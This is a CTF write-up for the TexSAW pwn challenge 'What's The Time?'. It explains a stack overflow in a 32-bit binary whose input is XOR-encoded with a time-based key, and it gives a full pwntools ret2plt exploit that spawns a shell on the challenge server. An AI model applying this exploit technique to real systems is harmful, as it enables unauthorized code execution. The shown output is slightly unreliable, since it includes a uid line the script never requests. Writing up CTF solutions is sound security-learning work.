# What's The Time? — PWN Writeup

**CTF:** TexSAW
**Category:** PWN
**Flag:** `texsaw{7h4nk_u_f0r_y0ur_71m3}`

## Challenge Description

> I think one of the hands of my watch broke. Can you tell me what the time is?
>
> `nc 143.198.163.4 3000`

## Recon

```
$ file whatsthetime
whatsthetime: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped

$ checksec --file=whatsthetime
Arch:    i386-32-little
RELRO:   Partial RELRO
Stack:   No canary found
NX:      NX enabled
PIE:     No PIE (0x8048000)
```

32-bit, no PIE, no stack canary — classic BOF setup. NX is on, so no shellcode.

Running the binary:

```
$ ./whatsthetime
I think one of my watch hands fell off!
Currently the time is: Fri Mar 27 20:51:00 2026
[garbled output / segfault with large input]
```

## Code Analysis

The binary has three relevant functions: `main`, `read_user_input`, and `win`.

### main

```c
time_t t = time(NULL);
// Compute floor(t / 60) * 60  — strips the seconds component
t = (t / 60) * 60;

puts("I think one of my watch hands fell off!");
printf("Currently the time is: %s", ctime(&t));

read_user_input(t);  // passes the rounded timestamp as the XOR key
```

The "broken watch hand" is the **seconds hand** — main computes the current unix timestamp rounded down to the nearest minute. This value is passed to `read_user_input` as the XOR key.

### read_user_input

```c
void read_user_input(uint32_t time_key) {
    char *heap_buf = malloc(0xa0);          // 160-byte heap buffer
    int n = read(0, heap_buf, 0xa0);        // read up to 160 bytes

    // XOR each 4-byte chunk with the key (key increments by 1 per chunk)
    for (int i = 0; i < n; i += 4) {
        for (int j = 0; j < 4; j++) {
            heap_buf[i+j] ^= (time_key >> (j*8)) & 0xff;
        }
        time_key++;
    }

    char stack_buf[64];
    memcpy(stack_buf, heap_buf, n);         // ← OVERFLOW: copies up to 160 bytes into 64-byte buffer
    write(1, stack_buf, 40);
}
```

**Vulnerability:** `memcpy` copies `n` (up to 160) bytes into a 64-byte stack buffer with no bounds check. No stack canary means we can overwrite the saved return address.

**Stack layout:**

| Offset from buffer start | Contents |
|--------------------------|----------|
| 0 – 63 | stack_buf (64 bytes) |
| 64 – 67 | saved ebx |
| 68 – 71 | saved ebp |
| 72 – 75 | **return address** ← target |

Wait — re-examining the frame: buffer is at `ebp-0x40`, so the return address is `0x40 + 4 (saved ebp) = 68` bytes from the buffer start.

**Offset to return address: 68 bytes.**

### win — the red herring

```
080491f6 <win>:
    printf("Executing shell /bin/sh...")
    system("ls")                 ← NOT /bin/sh!
    printf("oops wrong command")
```

Reading `.rodata` reveals the truth:

```
804a020: 25732025 732e2e2e 006c7300 6f6f7073   %s %s....ls.oops
```

`win()` calls `system("ls")`, not `system("/bin/sh")`. It's a decoy — running it just lists the directory.

### Useful strings in .rodata

```
0x804a018:  /bin/sh\0
0x804a029:  ls\0
```

`/bin/sh` is already present in the binary at a fixed, known address (no PIE).

## Exploit Strategy

**ret2plt:** Overwrite the return address with `system@plt`, pass the address of the `/bin/sh` string in `.rodata` as the argument.

```
system@plt  = 0x80490b0
"/bin/sh"   = 0x804a018
```

**Payload (desired bytes on stack):**
```
[68 bytes padding] [system@plt] [fake return] [ptr to "/bin/sh"]
```

**The XOR encoding:** Since the binary XORs our input before placing it on the stack, we must **pre-XOR** our payload with the same key stream so that after the binary's decode, the desired bytes appear on the stack.

Key stream: starts at `floor(time.time() / 60) * 60`, increments by 1 every 4 bytes.

```python
def xor_encode(payload, initial_key):
    encoded = bytearray()
    key_val = initial_key & 0xFFFFFFFF
    padded = payload + b'\x00' * ((4 - len(payload) % 4) % 4)
    for i in range(0, len(padded), 4):
        chunk = padded[i:i+4]
        for j in range(4):
            encoded.append(chunk[j] ^ ((key_val >> (j * 8)) & 0xff))
        key_val = (key_val + 1) & 0xFFFFFFFF
    return bytes(encoded[:len(payload)])
```

Because the key only changes once per minute (seconds are zeroed), we can always compute the correct key locally.

## Exploit

```python
from pwn import *
import time

SYSTEM_PLT = 0x80490b0
BIN_SH     = 0x804a018
OFFSET     = 68

def xor_encode(payload, initial_key):
    encoded = bytearray()
    key_val = initial_key & 0xFFFFFFFF
    padded = payload + b'\x00' * ((4 - len(payload) % 4) % 4)
    for i in range(0, len(padded), 4):
        chunk = padded[i:i+4]
        for j in range(4):
            encoded.append(chunk[j] ^ ((key_val >> (j * 8)) & 0xff))
        key_val = (key_val + 1) & 0xFFFFFFFF
    return bytes(encoded[:len(payload)])

conn = remote('143.198.163.4', 3000)

t   = int(time.time())
key = (t // 60) * 60

conn.recvuntil(b'2026\n', timeout=5)

payload  = b'A' * OFFSET
payload += p32(SYSTEM_PLT)   # overwrite return address → system()
payload += p32(0xdeadbeef)   # fake return from system (doesn't matter)
payload += p32(BIN_SH)       # argument: "/bin/sh"

conn.send(xor_encode(payload, key))
conn.sendline(b'cat flag.txt')

print(conn.recvall(timeout=6).decode(errors='replace'))
```

## Output

```
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
texsaw{7h4nk_u_f0r_y0ur_71m3}
```

## Summary

| Step | Detail |
|------|--------|
| Bug | Stack buffer overflow via `memcpy(stack[64], heap, 160)` |
| Bypass | No canary → direct return address overwrite |
| Trick 1 | Input is XOR'd with `floor(time/60)*60`; pre-XOR payload to compensate |
| Trick 2 | `win()` calls `system("ls")` not `system("/bin/sh")` — a red herring |
| Exploit | ret2plt: `system@plt` + `/bin/sh` address from `.rodata` |

**Flag:** `texsaw{7h4nk_u_f0r_y0ur_71m3}`
